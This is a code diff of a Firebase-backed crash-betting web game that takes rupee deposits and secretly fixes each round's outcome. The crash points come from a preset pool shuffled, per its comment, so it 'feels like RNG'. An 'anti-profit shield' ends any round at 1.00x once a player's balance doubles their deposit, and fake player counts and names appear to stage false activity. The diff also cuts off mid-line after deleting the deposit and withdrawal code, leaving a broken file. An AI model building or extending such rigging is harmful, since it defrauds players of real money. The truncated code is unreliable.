@@ -162,22 +162,44 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.database();
 
-// Sounds Setup
-const flySound = new Audio('https://files.catbox.moe/6797x7.mp3');
-const crashSound = new Audio('https://files.catbox.moe/9v9r38.mp3');
-const cashoutSound = new Audio('https://files.catbox.moe/v6p5at.mp3');
+// Full Audio Setup
+const flySnd = new Audio('https://files.catbox.moe/6797x7.mp3');
+const crashSnd = new Audio('https://files.catbox.moe/9v9r38.mp3');
+const winSnd = new Audio('https://files.catbox.moe/v6p5at.mp3');
 
 let uid, userEmail, balance = 0, wager = 0, depBal = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 1245;
 let b1 = { active: false, amt: 0, cashed: false }, b2 = { active: false, amt: 0, cashed: false };
 let isLoginMode = true;
 
-// Smart Control Variables
-let betCounter = 0; 
-let crashPoint = 1.0;
+// Smart Pattern Logic
+let betSequence = [];
+let betIndex = 0;
 let userEarlyCashout = false;
+let crashPoint = 1.0;
 
 const pakGmails = ["ali", "khan", "hamza", "ahmed", "waseem", "malik", "rana", "jutt", "asif", "nomi", "sunny", "bilal"];
 const pakAmts = [200, 500, 1000, 2000, 5000];
+
+// Har 10 bets ka naya random pool
+function generateSequence() {
+    let pool = [
+        () => (Math.random() * 5 + 10).toFixed(2),  // 10x-15x (1 bet)
+        () => (Math.random() * 15 + 15).toFixed(2), // 15x-30x (1 bet)
+        () => 1.00, // 1.0x (2 bets)
+        () => 1.00,
+        () => 1.10, // 1.1x (1 bet)
+        () => (Math.random() * 0.3 + 1.2).toFixed(2), // 1.2x-1.5x (3 bets)
+        () => (Math.random() * 0.3 + 1.2).toFixed(2),
+        () => (Math.random() * 0.3 + 1.2).toFixed(2),
+        () => (Math.random() * 3 + 2).toFixed(2),  // 2x-5x (1 bet)
+        () => (Math.random() * 5 + 5).toFixed(2)   // 5x-10x (1 bet)
+    ];
+    // Shuffle pool taake sequence RNG mehsoos ho
+    betSequence = pool.sort(() => Math.random() - 0.5);
+    betIndex = 0;
+}
+
+generateSequence();
 
 function toggleAuthMode() {
     isLoginMode = !isLoginMode;
@@ -220,28 +242,22 @@ auth.onAuthStateChanged(user => {
 });
 
 function calculateCrashPoint() {
-    // Condition 1: Anti-Profit Shield (Double balance check)
-    if (balance >= (depBal * 2)) {
-        return 1.00; 
-    }
+    // Shield: Agar balance double hua to crash
+    if (balance >= (depBal * 2)) return 1.00;
 
-    betCounter++;
-    if (betCounter > 10) {
-        // Condition 2: 50x Jackpot Logic
+    if (betIndex >= 10) {
         if (userEarlyCashout) {
-            betCounter = 0;
             userEarlyCashout = false;
-            return (Math.random() * 10 + 40).toFixed(2); // 40x to 50x
+            generateSequence();
+            return (Math.random() * 10 + 40).toFixed(2); // Jackpot
         } else {
-            betCounter = 1; // Reset if user didn't cash out early
+            generateSequence();
         }
     }
 
-    // Condition 3: Sequence Logic
-    if (betCounter <= 3) return (Math.random() * 3 + 2).toFixed(2); // 3 bets: 2x to 5x
-    if (betCounter == 4) return (Math.random() * 5 + 5).toFixed(2); // 1 bet: 5x to 10x
-    if (betCounter <= 6) return 1.00; // 2 bets: 1.0x (Instant Crash)
-    return (Math.random() * 0.4 + 1.0).toFixed(2); // 4 bets: 1.0x to 1.4x
+    let p = betSequence[betIndex]();
+    betIndex++;
+    return p;
 }
 
 function start7sTimer() {
@@ -269,7 +285,9 @@ function start7sTimer() {
 function launchPlane() {
     isWaiting = false; isFlying = true; mult = 1.0;
     document.getElementById('plane').style.display = 'block';
-    try { flySound.play(); flySound.loop = true; } catch(e){}
+    flySnd.currentTime = 0;
+    flySnd.loop = true;
+    flySnd.play().catch(()=>{});
     
     [1, 2].forEach(id => {
         let b = id === 1 ? b1 : b2;
@@ -311,7 +329,9 @@ function launchPlane() {
 
 function crash() {
     isFlying = false; 
-    try { flySound.pause(); flySound.currentTime = 0; crashSound.play(); } catch(e){}
+    flySnd.pause();
+    flySnd.currentTime = 0;
+    crashSnd.play().catch(()=>{});
     document.getElementById('mVal').innerText = "FLEW AWAY!";
     document.getElementById('mVal').style.color = "red";
     document.getElementById('plane').style.display = 'none';
@@ -334,13 +354,10 @@ function handleBet(id) {
         b.active = true; b.amt = amt; btn.innerText = "CANCEL"; btn.style.background = "#991b1b";
     } else if(isFlying && b.active && !b.cashed) {
         let win = b.amt * mult; 
-        
-        // Track early cashout for the 50x Jackpot condition
         if (mult < 5.0) { userEarlyCashout = true; }
-        
         db.ref('users/'+uid).update({ balance: balance + win });
         b.cashed = true; btn.innerText = "WON!"; btn.style.background = "#155724";
-        try { cashoutSound.play(); } catch(e){}
+        winSnd.play().catch(()=>{});
         document.getElementById('pop-win-val').innerText = mult.toFixed(2) + "x";
         document.getElementById('win-pop').style.display = 'block';
         setTimeout(() => document.getElementById('win-pop').style.display = 'none', 2000);
@@ -381,33 +398,4 @@ function loadHistory() {
         s.forEach(c => { 
             let data = c.val();
             let statusColor = data.status === 'pending' ? 'var(--gold)' : 'var(--win)';
-            let borderColor = data.status === 'pending' ? 'var(--gold)' : 'var(--win)';
-            h = `<div class="status-item" style="border-left-color:${borderColor}">
-                    <b>${data.type.toUpperCase()}</b>: Rs ${data.amount} <br>
-                    Status: <span style="color:${statusColor}">${data.status.toUpperCase()}</span>
-                 </div>` + h; 
-        });
-        document.getElementById('uStatusList').innerHTML = h || "No data.";
-    });
-}
-
-function submitDep() {
-    let a = document.getElementById('dAmt').value, t = document.getElementById('dTid').value;
-    if(a && t) { 
-        db.ref('requests').push({uid, email: userEmail, amount: a, tid: t, type: 'deposit', status: 'pending'}); 
-        // Sync depositBal for logic
-        db.ref('users/'+uid).update({ depositBal: parseFloat(a) });
-        alert("Deposit Request Sent!"); toggleTab(); 
-    }
-}
-
-function submitWit() {
-    let a = document.getElementById('wAmt').value, n = document.getElementById('wNum').value;
-    if(a >= 500 && wager >= 5000 && a <= balance) {
-        db.ref('requests').push({uid, email: userEmail, amount: a, number: n, type: 'withdraw', status: 'pending'});
-        db.ref('users/'+uid).update({ balance: balance - a }); alert("Withdrawal Request Sent!"); toggleTab();
-    } else alert("Min Rs 500 or Wager target (Rs 5000) not met.");
-}
-</script>
-</body>
-</html>
+            let borderColor = data.status === 'pending' ? 'var(-
